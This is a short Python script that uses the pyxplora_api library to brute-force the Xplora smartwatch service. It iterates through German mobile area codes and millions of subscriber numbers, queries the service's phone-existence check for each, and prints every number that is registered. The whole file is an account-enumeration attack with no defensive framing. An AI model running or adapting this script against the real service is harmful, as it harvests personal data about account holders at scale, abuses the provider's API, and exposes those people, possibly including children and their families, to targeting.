from pyxplora_api import pyxplora_api as PXA
from pyxplora_api.status import UserContactType

german_area_codes = [
    "1511",
    "1512",
    "1514",
    "1515",
    "1516",
    "1517",
    "1520",
    "1522",
    "1523",
    "1525",
    "15566",
    "1570",
    "1573",
    "1575",
    "1577",
    "1578",
    "1590",
    "160",
    "162",
    "163",
    "170",
    "171",
    "172",
    "173",
    "174",
    "175",
    "176",
    "177",
    "178",
    "179",
]

country_code = "+49"


def main():
    xplora = PXA.PyXploraApi()
    xplora.init(signup=False)
    for i in range(0, 99999999):
        if i < 1000000:
            i = str(i).zfill(7)
        for area_code in german_area_codes:
            data = xplora.checkEmailOrPhoneExist(
                UserContactType.PHONE, countryCode=country_code, phoneNumber=f"{area_code}{i}"
            )
            if data:
                print(f"{country_code}{area_code}{i} is registered")


if __name__ == "__main__":
    main()
